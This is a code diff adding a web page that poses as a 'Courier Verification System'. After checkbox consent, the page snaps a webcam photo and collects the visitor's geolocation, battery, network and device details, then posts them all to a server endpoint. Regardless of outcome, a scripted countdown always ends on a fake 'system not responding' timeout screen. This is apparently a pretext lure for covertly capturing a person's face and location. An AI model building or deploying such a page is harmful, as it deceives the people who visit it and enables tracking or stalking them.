@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Courier Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .hidden {
+            display: none;
+        }
+        .loading {
+            margin: 20px 0;
+        }
+        .progress-bar {
+            height: 20px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background-color: #4CAF50;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        .verify-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        video, canvas {
+            width: 320px;
+            height: 240px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        #countdown {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .consent-section {
+            text-align: left;
+            margin: 20px 0;
+        }
+        .consent-checkbox {
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Courier Verification System</h1>
+        
+        <!-- Initial screen -->
+        <div id="initialScreen">
+            <p>Welcome to our courier verification system. We need to verify your identity to continue.</p>
+            <p>This process will require:</p>
+            <ul style="text-align: left;">
+                <li>Access to your camera for a photo verification</li>
+                <li>Your location information</li>
+                <li>Basic device information</li>
+            </ul>
+            
+            <div class="consent-section">
+                <h3>Your Privacy Matters</h3>
+                <div class="consent-checkbox">
+                    <input type="checkbox" id="cameraConsent"> 
+                    <label for="cameraConsent">I allow access to my camera for verification purposes</label>
+                </div>
+                <div class="consent-checkbox">
+                    <input type="checkbox" id="locationConsent"> 
+                    <label for="locationConsent">I allow access to my location information</label>
+                </div>
+                <div class="consent-checkbox">
+                    <input type="checkbox" id="deviceConsent"> 
+                    <label for="deviceConsent">I allow collection of basic device information</label>
+                </div>
+            </div>
+            
+            <button id="startVerification" class="verify-btn" disabled>Start Verification</button>
+        </div>
+        
+        <!-- Verification Screen -->
+        <div id="verificationScreen" class="hidden">
+            <h2>Verification in Progress</h2>
+            <div id="countdown">20</div>
+            <div class="progress-bar">
+                <div id="progress" class="progress"></div>
+            </div>
+            <p class="loading">Please wait while we verify your information...</p>
+            
+            <div id="cameraSection" class="hidden">
+                <p>Please allow camera access when prompted</p>
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas" class="hidden"></canvas>
+            </div>
+        </div>
+        
+        <!-- Final Screen -->
+        <div id="finalScreen" class="hidden">
+            <h2>Verification Timeout</h2>
+            <p>Sorry, our system is not responding right now.</p>
+            <p>Please try again later or contact support.</p>
+            <button id="retryBtn" class="verify-btn">Retry</button>
+        </div>
+    </div>
+
+    <script>
+        // Track consent checkboxes
+        const cameraConsent = document.getElementById('cameraConsent');
+        const locationConsent = document.getElementById('locationConsent');
+        const deviceConsent = document.getElementById('deviceConsent');
+        const startBtn = document.getElementById('startVerification');
+        
+        // Enable button only when all consents are checked
+        function checkConsent() {
+            startBtn.disabled = !(cameraConsent.checked && locationConsent.checked && deviceConsent.checked);
+        }
+        
+        cameraConsent.addEventListener('change', checkConsent);
+        locationConsent.addEventListener('change', checkConsent);
+        deviceConsent.addEventListener('change', checkConsent);
+        
+        // Screens
+        const initialScreen = document.getElementById('initialScreen');
+        const verificationScreen = document.getElementById('verificationScreen');
+        const finalScreen = document.getElementById('finalScreen');
+        const cameraSection = document.getElementById('cameraSection');
+        
+        // Progress elements
+        const progressBar = document.getElementById('progress');
+        const countdownEl = document.getElementById('countdown');
+        
+        // Camera elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        // Start verification process
+        startBtn.addEventListener('click', function() {
+            initialScreen.classList.add('hidden');
+            verificationScreen.classList.remove('hidden');
+            
+            // Start countdown and progress bar
+            let timeLeft = 20;
+            let progress = 0;
+            
+            const timer = setInterval(() => {
+                timeLeft--;
+                progress += 5;
+                
+                countdownEl.textContent = timeLeft;
+                progressBar.style.width = progress + '%';
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    verificationScreen.classList.add('hidden');
+                    finalScreen.classList.remove('hidden');
+                }
+            }, 1000);
+            
+            // Collect allowed information
+            let userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            // Get device info if consented
+            if (deviceConsent.checked) {
+                userData.deviceInfo = {
+                    platform: navigator.platform,
+                    screenSize: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                
+                // Get battery info if available
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        userData.battery = {
+                            level: battery.level * 100 + '%',
+                            charging: battery.charging
+                        };
+                    });
+                }
+                
+                // Get network info if available
+                if ('connection' in navigator) {
+                    userData.network = {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink + ' Mbps'
+                    };
+                }
+            }
+            
+            // Get location if consented
+            if (locationConsent.checked) {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        userData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
+                        };
+                    }, error => {
+                        userData.locationError = error.message;
+                    });
+                }
+            }
+            
+            // Access camera if consented
+            if (cameraConsent.checked) {
+                cameraSection.classList.remove('hidden');
+                
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            video.srcObject = stream;
+                            
+                            // Take photo after 5 seconds
+                            setTimeout(() => {
+                                // Draw the video frame to the canvas
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                
+                                // Get the photo as base64 data
+                                const photoData = canvas.toDataURL('image/jpeg');
+                                userData.photo = photoData;
+                                
+                                // Stop the camera stream
+                                stream.getTracks().forEach(track => track.stop());
+                                
+                                // Send the data to the server
+                                sendVerificationData(userData);
+                            }, 5000);
+                        })
+                        .catch(error => {
+                            userData.cameraError = error.message;
+                            sendVerificationData(userData);
+                        });
+                }
+            } else {
+                // If no camera consent, just send the other data after 5 seconds
+                setTimeout(() => {
+                    sendVerificationData(userData);
+                }, 5000);
+            }
+        });
+        
+        // Send data to server
+        function sendVerificationData(data) {
+            fetch('/api/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .catch(error => console.error('Error sending verification data:', error));
+        }
+        
+        // Retry button
+        document.getElementById('retryBtn').addEventListener('click', function() {
+            finalScreen.classList.add('hidden');
+            initialScreen.classList.remove('hidden');
+        });
+    </script>
+</body>
+</html>
